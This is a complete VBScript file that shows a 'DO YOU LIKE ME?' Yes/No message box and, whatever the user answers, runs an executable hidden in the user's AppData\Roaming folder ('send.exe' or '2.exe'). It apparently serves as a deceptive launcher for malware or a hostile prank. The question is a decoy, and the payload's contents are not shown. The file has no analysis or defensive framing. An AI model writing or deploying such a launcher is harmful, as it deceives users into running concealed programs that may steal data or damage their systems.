Set oShell = CreateObject ("WScript.Shell")

intAnswer = _
    Msgbox("DO YOU LIKE ME?", _
         vbYesNo, "QUESTION")
If intAnswer = vbYes Then
     oShell.run "%userprofile%/AppData/Roaming/send.exe"
Else
     oShell.run "%userprofile%/AppData/Roaming/2.exe"
End If
